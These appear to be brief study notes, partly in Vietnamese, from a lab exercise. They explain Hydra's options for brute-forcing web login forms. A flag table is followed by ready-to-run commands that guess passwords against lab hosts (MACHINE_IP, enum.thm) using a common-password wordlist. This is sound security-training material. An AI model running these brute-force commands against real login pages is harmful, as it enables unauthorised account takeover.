
| **Option**          | **Description**                                                                        |
| ------------------- | -------------------------------------------------------------------------------------- |
| -l                  | the username for (web form) login                                                      |
| -P                  | the password list to use                                                               |
| http-post-form      | the type of the form is POST                                                           |
| <path>              | the login page URL, for example, login.php                                             |
| <login_credentials> | the username and password used to log in, for example, username=^USER^&password=^PASS^ |
| <invalid_response>  | part of the response when the login fails                                              |
| -V                  | verbose output for every attempt                                                       |


sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
ví dụ :  hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt http-get://enum.thm/labs/basic_auth/:A=Basic -vv 

Below is a more concrete example Hydra command to brute force a POST login form:

hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V